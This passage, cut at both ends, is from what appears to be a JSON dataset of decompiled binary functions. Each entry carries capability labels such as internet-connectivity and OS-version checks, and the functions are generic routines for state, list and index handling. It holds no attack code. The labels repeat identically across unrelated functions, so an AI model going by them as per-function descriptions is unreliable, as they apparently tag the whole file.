fcn.0040928c();\n                fcn.00404c14();\n            }\n            if (cVar2 != '\\0') {\n                (**(*piVar3 + 0xa8))(0, in_ECX);\n            }\n        }\n    }\n    else {\n        puStack4136 = &stack0xfffffffc;\n        (**(*piVar3 + 0x230))();\n    }\n    *in_FS_OFFSET = uStack4144;\n    puStack4136 = 0x4756e0;\n    uStack4140 = 0x4756d8;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 506
    },
    "004756ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004756ec(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint *in_FS_OFFSET;\n    uchar auStack8209 [4057];\n    uint uStack4152;\n    uint uStack4148;\n    uchar *puStack4144;\n    uint uStack4140;\n    uint uStack4136;\n    uchar *puStack4132;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4132 = &stack0xfffffffc;\n    piVar1 = 0x2;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n    } while (piVar2 + -1 != NULL);\n    uStack4136 = 0x4757d8;\n    uStack4140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefd4;\n    if (arg_8h == '\\0') {\n        puStack4144 = 0x475743;\n        iVar3 = (**(*in_EDX + 0x70))();\n        if (iVar3 < 0x2001) {\n            if (in_ECX != 0) {\n                puStack4144 = &stack0xffffdfef;\n                uStack4148 = 1;\n                uStack4152 = 0x4757b0;\n                (**(*piVar2 + 0xa8))();\n            }\n            puStack4144 = 0x4757c2;\n            (**(*piVar2 + 0x1e8))();\n        }\n        else {\n            puStack4144 = 0x475751;\n            (**(*in_EDX + 0x70))();\n            puStack4144 = 0x47575b;\n            fcn.00404c14();\n            puStack4144 = 0x475763;\n            puStack4144 = fcn.00404a88();\n            if (in_ECX != 0) {\n                uStack4148 = 1;\n                uStack4152 = 0x475781;\n                (**(*piVar2 + 0xa8))();\n            }\n            puStack4144 = 0x475790;\n            (**(*piVar2 + 0x1e8))();\n        }\n    }\n    else {\n        puStack4144 = 0x475737;\n        puStack4132 = &stack0xfffffffc;\n        (**(*piVar2 + 0x1e8))();\n    }\n    *in_FS_OFFSET = uStack4140;\n    puStack4132 = 0x4757df;\n    uStack4136 = 0x4757d7;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 632
    },
    "0047598c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047598c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = fcn.0046d2fc();\n    if ((iVar1 == 0) && (*(in_EAX + 0xa9) != '\\0')) {\n        iVar1 = fcn.0046ce98();\n    }\n    if (iVar1 == 0) {\n        fcn.0046d2fc();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00475a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475a70(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uchar in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(in_ECX + 0x42) == '\\0') {\n        var_5h = *(in_EAX + 0x9d);\n        *(in_EAX + 0x9d) = in_DL;\n        uStack20 = 0x475ac9;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack24;\n        var_4h = in_EAX;\n        (**(*in_ECX + 0xb4))();\n        *in_FS_OFFSET = uStack24;\n        *(var_4h + 0x9d) = var_5h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00475d0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00475d0c(uint arg_8h, double *arg_ch)\n\n{\n    char cVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    int32_t *in_EDX;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint *arg_ch_00;\n    uint arg_8h_00;\n    uint uVar4;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar4 = 0x475ed8;\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    // switch table (7 cases) at 0x475d71\n    switch(*(in_EDX + 0x10)) {\n    case 8:\n        if (arg_8h == '\\0') {\n            cVar1 = fcn.004642a0();\n            if (cVar1 == '\\0') {\n                fcn.0046dd78();\n                var_10h = 0;\n                var_ch = CONCAT31(var_ch._1_3_, 0xb);\n                arg_ch_00 = &var_10h;\n                uVar4 = 0;\n                fcn.0040675c();\n                fcn.0040c918(uVar4, arg_ch_00);\n                fcn.00403fc0();\n            }\n        }\n        else {\n            (**(*in_EDX + 0x88))(*in_ECX, in_ECX[1]);\n            fcn.00464214(arg_8h_00, uVar4);\n        }\n        break;\n    case 9:\n    case 10:\n    case 0xb:\n        if (arg_8h == '\\0') {\n            fVar3 = fcn.00475ae0();\n            *arg_ch = fVar3;\n        }\n        else {\n            fcn.00475b6c(*in_ECX, in_ECX[1]);\n            *arg_ch = var_10h;\n            *(arg_ch + 4) = var_ch;\n        }\n        break;\n    case 0xc:\n        if (arg_8h == '\\0') {\n            (**(*in_EDX + 0x70))();\n            fcn.00475bb4();\n        }\n        else {\n            fcn.00475c70(&stack0xfffffffc);\n        }\n        break;\n    case 0xd:\n        if (arg_8h == '\\0') {\n            fcn.00475bb4();\n        }\n        else {\n            fcn.00475c70(&stack0xfffffffc);\n        }\n        break;\n    case 0x24:\n        *arg_ch = *in_ECX;\n        *(arg_ch + 4) = in_ECX[1];\n        *(arg_ch + 1) = in_ECX[2];\n        *(arg_ch + 0xc) = in_ECX[3];\n        break;\n    case 0x25:\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *arg_ch = *in_ECX;\n            in_ECX = in_ECX + 1;\n            arg_ch = arg_ch + 4;\n        }\n        *arg_ch = *in_ECX;\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 770
    },
    "00475f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475f40(int32_t arg_8h)\n\n{\n    if (*(*(arg_8h + -4) + 0x9d) != '\\x04') {\n        if ((*(*(arg_8h + -4) + 0xa4) == '\\0') || (*(*(arg_8h + -8) + 0x42) != '\\0')) {\n            if ((*(*(arg_8h + -4) + 0x68) != 0) &&\n               ((*(*(arg_8h + -4) + 0xa7) != '\\0' && (*(*(arg_8h + -8) + 0x42) == '\\0')))) {\n                fcn.00476ab8();\n                (**(**(arg_8h + -4) + 0x80))();\n            }\n        }\n        else {\n            fcn.00476ab8();\n            (**(**(arg_8h + -4) + 0x170))();\n        }\n        (**(**(arg_8h + -8) + 0x38))();\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "00475fe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475fe0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    if (*(*(arg_8h + -4) + 0x8c) != 0) {\n        if (*(*(arg_8h + -4) + 0x9d) != '\\x03') {\n            fcn.00476b0c();\n        }\n        iVar3 = *(*(*(arg_8h + -4) + 0x8c) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.0041c4c8();\n                cVar1 = fcn.00474d20();\n                if (cVar1 != '\\0') {\n                    (**(*piVar2 + 0xac))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    if ((*(*(arg_8h + -4) + 0x9d) == '\\n') && (iVar3 = *(*(*(arg_8h + -4) + 0x44) + 8),  -1 < iVar3 + -1)) {\n        do {\n            arg_8h_00 = 0;\n            fcn.0041c4c8();\n            fcn.004742a8(arg_8h_00);\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00476100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476100(int32_t param_1, uchar param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar2 = fcn.00476254();\n    if ((cVar2 == '\\0') && (*(in_EAX + 0x9d) != '\\n')) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    // switch table (10 cases) at 0x476144\n    switch(param_2) {\n    case 0:\n        if ((*(param_1 + 0x42) == '\\0') || (*(param_1 + 0x42) == '\\x03')) {\n            fcn.004749cc();\n        }\n        fcn.00475f40(&stack0xfffffffc);\n        break;\n    case 2:\n    case 3:\n        fcn.00475fe0(&stack0xfffffffc);\n        break;\n    case 4:\n        *(*(in_EAX + 0x40) + 0x35) = 0;\n        cVar2 = fcn.00476254();\n        if (cVar2 != '\\0') {\n            *(in_EAX + 0x9e) = 4;\n        }\n        break;\n    case 6:\n        cVar2 = fcn.00476254();\n        if (cVar2 != '\\0') {\n            bVar1 = true;\n            *(in_EAX + 0x9e) = 4;\n        }\n        break;\n    case 7:\n        fcn.004760ac(&stack0xfffffffc);\n        break;\n    case 8:\n        *(*(in_EAX + 0x38) + 0x20) = 0;\n        break;\n    case 9:\n        *(*(in_EAX + 0x40) + 0x35) = 0;\n    }\n    if (bVar1) {\n        iVar3 = *(*(in_EAX + 0x44) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                fcn.0041c4c8();\n                fcn.00474320();\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        if (*(in_EAX + 0x6c) != NULL) {\n            (****(in_EAX + 0x6c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 570
    },
    "00476254": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00476254(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x70) != 0;\n}\n",
        "token_count": 48
    },
    "0047625c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047625c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x70) == 0) {\n        *(in_EAX + 0x9f) = *(in_EAX + 0x9d);\n        *(in_EAX + 0x9e) = 2;\n    }\n    *(in_EAX + 0x70) = *(in_EAX + 0x70) + 1;\n    return;\n}\n",
        "token_count": 110
    },
    "0047627c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047627c(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX[0x1c] != 0) && (in_EAX[0x1c] = in_EAX[0x1c] + -1,  in_EAX[0x1c] == 0)) {\n        if (*(in_EAX + 0x9f) != *(in_EAX + 0x9d)) {\n            (**(*in_EAX + 0xac))();\n        }\n        if ((*(in_EAX + 0x9f) != '\\0') && (*(in_EAX + 0x9d) != '\\0')) {\n            (**(*in_EAX + 0xac))();\n        }\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "00476350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476350(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4764c2;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x47637c;\n    iVar1 = fcn.00405844();\n    iVar2 = iVar1 + 1;\n    if (param_2 != iVar2) {\n        if (param_2 < 1) {\n            puStack48 = 0x4763b4;\n            fcn.00405b44();\n        }\n        else {\n            uStack52 = 0x4763a1;\n            puStack48 = param_2;\n            fcn.00405a18();\n        }\n        if (param_2 < iVar2) {\n            if (param_2 != 0) {\n                puStack48 = 0x4763d0;\n                fcn.00402d34();\n            }\n            if (param_2 <= iVar1) {\n                iVar2 = (iVar1 - param_2) + 1;\n                do {\n                    puStack48 = 0x4763f8;\n                    (**(*in_EAX + 0x1b0))();\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n        }\n        else {\n            if (iVar2 != 0) {\n                puStack48 = 0x47641d;\n                fcn.00402d34();\n            }\n            uStack52 = 0x47645c;\n            uStack56 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc8;\n            puStack48 = &stack0xfffffffc;\n            for (; iVar2 < param_2; iVar2 = iVar2 + 1) {\n                uVar3 = (**(*in_EAX + 0x1ac))();\n                *(iVar2 * 4) = uVar3;\n            }\n            *in_FS_OFFSET = uStack56;\n        }\n        puStack48 = 0x4764a6;\n        fcn.00405b80();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4764c9;\n    uStack40 = 0x4764c1;\n    fcn.00405b44();\n    return;\n}\n",
        "token_count": 634
    },
    "004764d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004764d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        for (iVar1 = *(*(arg_8h + -4) + 0x48); iVar1 != 0; iVar1 = *(iVar1 + 8)) {\n            if (*(iVar1 + 0x15) != '\\0') {\n                *(iVar1 + 0x10) = *(iVar1 + 0x10) + in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "004764f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004764f8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (param_2 != in_EAX[0x13]) {\n        if ((param_2 < in_EAX[0x13]) && (0 < in_EAX[0x14])) {\n            iVar2 = in_EAX[0x15];\n            for (iVar1 = in_EAX[0x12]; iVar1 != 0; iVar1 = *(iVar1 + 8)) {\n                if ((*(iVar1 + 0x15) != '\\0') && (*(iVar1 + 0x10) < iVar2)) {\n                    iVar2 = *(iVar1 + 0x10);\n                }\n            }\n            iVar1 = fcn.0040583c();\n            if (iVar1 <= param_2 + iVar2) {\n                iVar1 = fcn.0040583c();\n                iVar2 = (iVar1 - param_2) + -1;\n            }\n            var_8h = param_2;\n            if (-1 < param_2 + -1) {\n                do {\n                    fcn.00476a50();\n                    var_8h = var_8h + -1;\n                } while (var_8h != 0);\n            }\n            in_EAX[0x15] = in_EAX[0x15] - iVar2;\n            if (in_EAX[0x16] != -1) {\n                in_EAX[0x16] = in_EAX[0x16] - iVar2;\n            }\n            if (param_2 < in_EAX[0x14]) {\n                in_EAX[0x14] = param_2;\n            }\n            fcn.004764d0(&stack0xfffffffc);\n        }\n        (**(*in_EAX + 0x184))();\n        in_EAX[0x13] = param_2;\n        if ((*(in_EAX + 7) & 8) == 0) {\n            (**(*in_EAX + 0x13c))();\n            (**(*in_EAX + 0x144))();\n            fcn.004764d0(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 543
    },
    "00476604": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476604(uint param_1)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    cVar1 = (**(*in_EAX + 0x204))(param_1);\n    if (cVar1 != '\\0') {\n        iVar5 = 1;\n        in_EAX[0x12] = 0;\n        iVar2 = *(in_EAX[0x11] + 8) + -1;\n        if (-1 < iVar2) {\n            do {\n                iVar3 = fcn.0041c4c8();\n                iVar3 = *(*(iVar3 + 0x34) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        iVar4 = fcn.0041c4c8();\n                        *(iVar4 + 8) = in_EAX[0x12];\n                        in_EAX[0x12] = iVar4;\n                        if (iVar5 < *(iVar4 + 0xc)) {\n                            iVar5 = *(iVar4 + 0xc);\n                        }\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n        fcn.004764f8();\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "00476a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476a50(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x88) == '\\0') && (param_1 != param_2)) {\n        uVar1 = *(*(in_EAX + 0x5c) + param_2 * 4);\n        if (param_2 < param_1) {\n            fcn.00402d34();\n        }\n        else {\n            fcn.00402d34();\n        }\n        *(*(in_EAX + 0x5c) + param_1 * 4) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00476b0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00476b0c(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (0 < in_EAX[0x14]) {\n        (**(*in_EAX + 0x188))();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00476bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00476bc0(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_5h;\n    int32_t *var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if ((in_EAX[0x1a] < 1) && (*(in_EAX + 0x29) == '\\0')) {\n        return;\n    }\n    var_5h = *(in_EAX + 0x9d);\n    *(in_EAX + 0x9d) = 5;\n    uStack20 = 0x476c27;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack24;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x80))();\n    *in_FS_OFFSET = uStack24;\n    *(var_4h + 0x9d) = var_5h;\n    return;\n}\n",
        "token_count": 235
    },
    "00476d24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00476d24(void)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x476d34;\n    fcn.00477530();\n    puStack16 = 0x476d3f;\n    (**(*in_EAX + 0xfc))();\n    bVar1 = false;\n    if (*(in_EAX + 0x22) == '\\0') {\n        puStack16 = 0x476d82;\n        (**(*in_EAX + 0x90))();\n    }\n    else {\n        if (*(in_EAX + 0x28) == '\\0') {\n            puStack16 = 0x476d66;\n            (**(*in_EAX + 0x178))();\n            puStack16 = 0x476d73;\n            (**(*in_EAX + 0x178))();\n        }\n        bVar1 = true;\n    }\n    uStack20 = 0x476de7;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    (**(*in_EAX + 0x1c8))();\n    if (!bVar1) {\n        (**(*in_EAX + 0x140))();\n        (**(*in_EAX + 0x13c))();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x476dee;\n    *(in_EAX + 0x28) = 1;\n    uStack20 = 0x476ddb;\n    (**(*in_EAX + 0xac))();\n    uStack20 = 0x476de6;\n    (**(*in_EAX + 0xd8))();\n    return;\n}\n",
        "token_count": 424
    },
    "00476dfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00476dfc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x476e12;\n    fcn.00477530();\n    puStack36 = 0x476e22;\n    (**(*in_EAX + 0xfc))();\n    if (((param_2 < 1) || (*(in_EAX + 0xa1) != '\\0')) && ((-1 < param_2 || (*(in_EAX + 0x28) != '\\0')))) {\n        return 0;\n    }\n    *(in_EAX + 0x28) = 0;\n    *(in_EAX + 0xa1) = 0;\n    iVar1 = in_EAX[0x14];\n    uStack40 = 0x476f91;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    puVar2 = &stack0xfffffffc;\n    if (0 < param_2) {\n        do {\n            if (in_EAX[0x15] < in_EAX[0x14] + -1) {\n                in_EAX[0x15] = in_EAX[0x15] + 1;\n            }\n            else {\n                cVar3 = (**(*in_EAX + 0x140))();\n                if (cVar3 == '\\0') {\n                    *(in_EAX + 0xa1) = 1;\n                    puVar2 = puStack36;\n                    break;\n                }\n                if (in_EAX[0x15] < in_EAX[0x14] + -1) {\n                    in_EAX[0x15] = in_EAX[0x15] + 1;\n                }\n            }\n            param_2 = param_2 + -1;\n            puVar2 = puStack36;\n        } while (0 < param_2);\n    }\n    do {\n        puStack36 = puVar2;\n        if (-1 < param_2) {\ncode_r0x00476f4c:\n            *in_FS_OFFSET = uStack44;\n            puStack36 = 0x476f98;\n            if (in_EAX[0x14] == iVar1) {\n                uStack40 = 0x476f85;\n                (**(*in_EAX + 0xac))();\n            }\n            else {\n                uStack40 = 0x476f73;\n                (**(*in_EAX + 0xac))();\n            }\n            uStack40 = 0x476f90;\n            uVar4 = (**(*in_EAX + 0xd8))();\n            return uVar4;\n        }\n        if (in_EAX[0x15] < 1) {\n            cVar3 = (**(*in_EAX + 0x148))();\n            if (cVar3 == '\\0') {\n                *(in_EAX + 0x28) = 1;\n                goto code_r0x00476f4c;\n            }\n            if (0 < in_EAX[0x15]) {\n                in_EAX[0x15] = in_EAX[0x15] + -1;\n            }\n        }\n        else {\n            in_EAX[0x15] = in_EAX[0x15] + -1;\n        }\n        param_2 = param_2 + 1;\n        puVar2 = puStack36;\n    } while( true );\n}\n",
        "token_count": 848
    },
    "00476fa4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00476fa4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (0 < in_EAX[0x1f]) {\n        (**(*in_EAX + 0x174))();\n        return;\n    }\n    fcn.00476dfc();\n    return;\n}\n",
        "token_count": 68
    },
    "00477198": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00477198(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4771d2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    fcn.00476b0c();\n    (*arg_10h)();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 146
    },
    "00477228": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
